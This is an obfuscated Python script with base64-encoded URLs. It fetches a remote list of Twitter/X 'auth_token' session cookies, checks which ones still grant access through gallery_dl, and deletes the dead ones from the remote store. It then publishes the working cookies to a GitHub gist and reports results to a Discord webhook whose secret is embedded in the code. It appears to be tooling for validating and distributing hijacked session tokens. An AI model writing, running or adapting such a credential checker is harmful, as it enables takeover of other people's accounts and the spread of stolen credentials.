import base64 as _b,time as _t,sys as _s,httpx as _h,signal as _sg,os as _o
_=lambda x:_b.b64decode(x).decode()
_T=_("aHR0cHM6Ly9hdXRoLXRva2Vucy1hcGkubXphbXphbWFma2FyaGFkaXEud29ya2Vycy5kZXYvYXBpL3Rva2VuL2xpc3Q=")
_D=_("aHR0cHM6Ly9hdXRoLXRva2Vucy1hcGkubXphbXphbWFma2FyaGFkaXEud29ya2Vycy5kZXYvYXBpL3Rva2VuL2RlbGV0ZQ==")
_U=_("aHR0cHM6Ly94LmNvbS94YmF0Y2hkZW1vL21lZGlh")
_W=_("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0Njc1NjQ3NzQ1MTYzMjcyNC83NzVyeTlxdlRaRU5hR2JkSnVSZUx4SGdYVVNWNjZwVl8xTG5pMGM3dFN5cEZJTEhuWUN0ZlptYVBEZEdKTHJTbEJ3NQ==")
_MAX=500
class _TO(Exception):pass
def _th(s,f):raise _TO()
def _vv(t):
    from gallery_dl import config as _c,extractor as _e
    from gallery_dl.extractor.common import Message as _M
    _c.clear();_c.set(("extractor","twitter"),"cookies",{"auth_token":t});_c.set(("extractor","twitter"),"cursor",True)
    _x=_e.find(_U)
    if _x is None or _x.category!="twitter":return False,"Extractor not found"
    for _m in _x:
        if _m[0] is _M.Url or _m[0] is _M.Directory:return True,None
    return False,"No content found"
def _v(t):
    try:
        if _o.name!='nt':_sg.signal(_sg.SIGALRM,_th);_sg.alarm(5)
        r=_vv(t)
        if _o.name!='nt':_sg.alarm(0)
        return r
    except _TO:return False,"Timeout"
    except Exception as e:
        if _o.name!='nt':_sg.alarm(0)
        _r=str(e).lower()
        if "401" in _r or "unauthorized" in _r:return False,"Unauthorized"
        if "403" in _r or "forbidden" in _r:return False,"Forbidden"
        if "rate limit" in _r or "429" in _r:return False,"Rate limited"
        return False,str(e)[:50]
def _d(t):
    try:return _h.get(f"{_D}/{t}",timeout=30).status_code==200
    except:return False
def _trim():
    try:
        _r=_h.get(_T,timeout=30).json();_l=_r["tokens"]
        if len(_l)>_MAX:
            _old=_l[_MAX:];_dc=0
            print(f"Trimming {len(_old)} old tokens...")
            for t in _old:
                if _d(t):_dc+=1
            print(f"Trimmed: {_dc}/{len(_old)}")
            return _dc
    except:pass
    return 0
def _g(tokens):
    _gid=_o.environ.get("GIST_ID","")
    _gt=_o.environ.get("GH_TOKEN","")
    if not _gid or not _gt:print("Gist: skipped (no GIST_ID/GH_TOKEN)");return
    try:
        import json as _j
        _content=_j.dumps({"tokens":tokens,"total":len(tokens)},indent=2)
        _h.patch(f"https://api.github.com/gists/{_gid}",headers={"Authorization":f"token {_gt}","Accept":"application/vnd.github+json"},json={"files":{"auth_token_list.json":{"content":_content}}},timeout=30)
        print(f"Gist: updated ({len(tokens)} tokens)")
    except Exception as e:print(f"Gist: failed ({e})")
def _w(total,valid,invalid,deleted,trimmed,duration):
    try:
        _m=int(duration//60);_sec=int(duration%60);_dur=f"{_m}m {_sec}s" if _m>0 else f"{_sec}s"
        _desc=f"Total: {total}\nValid: {valid}\nInvalid: {invalid}\nDeleted: {deleted}\nDuration: {_dur}"
        if trimmed>0:_desc+=f"\nTrimmed: {trimmed}"
        _h.post(_W,json={"embeds":[{"title":"Token Validation Report","color":3066993 if invalid==0 else 15158332,"description":_desc}]},timeout=10)
    except:pass
def main():
    _st=_t.time();print("Fetching...");_r=_h.get(_T,timeout=30).json();_l=_r["tokens"];print(f"Total: {len(_l)}\n")
    _vc=_ic=_dc=0;_valid=[]
    for i,t in enumerate(_l[:_MAX],1):
        print(f"[{i}/{min(len(_l),_MAX)}] {t[:8]}...",end=" ",flush=True);v,e=_v(t)
        if v:print("✓");_vc+=1;_valid.append(t)
        else:
            print(f"✗ {e}");_ic+=1;print(f"  Deleting...",end=" ",flush=True)
            if _d(t):print("✓");_dc+=1
            else:print("✗")
        _t.sleep(1)
    _tc=_trim()
    _g(_valid)
    _dur=_t.time()-_st;print(f"\n{'='*40}\nTotal:{min(len(_l),_MAX)} Valid:{_vc} Invalid:{_ic} Deleted:{_dc} Trimmed:{_tc} Duration:{_dur:.0f}s")
    _w(min(len(_l),_MAX),_vc,_ic,_dc,_tc,_dur)
    if _ic>_dc:_s.exit(1)
if __name__=="__main__":main()
